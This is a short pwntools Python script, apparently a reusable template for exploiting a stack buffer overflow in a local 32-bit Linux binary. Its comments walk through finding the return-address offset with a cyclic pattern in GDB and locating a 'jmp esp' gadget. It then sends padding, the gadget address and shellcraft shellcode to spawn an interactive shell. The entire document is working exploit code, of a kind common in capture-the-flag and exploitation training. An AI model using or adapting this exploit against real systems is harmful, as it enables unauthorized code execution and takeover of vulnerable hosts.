from pwn import *
import sys

# Set architecture and operating system for the target
context.update(arch='i386', os='linux')

# Launch the target process (replace "name-of-executable" with the actual binary name)
io = process("./name-of-executable")

# Send a cyclic pattern to the process to determine the offset for the return address
# Uncomment the following block and run it with GDB to generate the cyclic pattern
"""
gdb.attach(io, 'continue')
pattern = cyclic(512)
io.sendline(pattern)
pause()
sys.exit()
"""

# Once the program crashes with a segmentation fault, analyze the core dump in GDB to find the offset
# Replace the offset value (140 in this example) with the correct one
offset = 140

# Find the memory address of "jmp esp" instruction in the binary
binary = ELF("./name-of-executable")
jmp_esp = next(binary.search(asm("jmp esp")))

# Create the exploit payload
exploit = flat(["A" * offset, p32(jmp_esp), asm(shellcraft.sh())])

# Send the exploit payload to the target process
io.sendline(exploit)

# Gain interactive shell access
io.interactive()
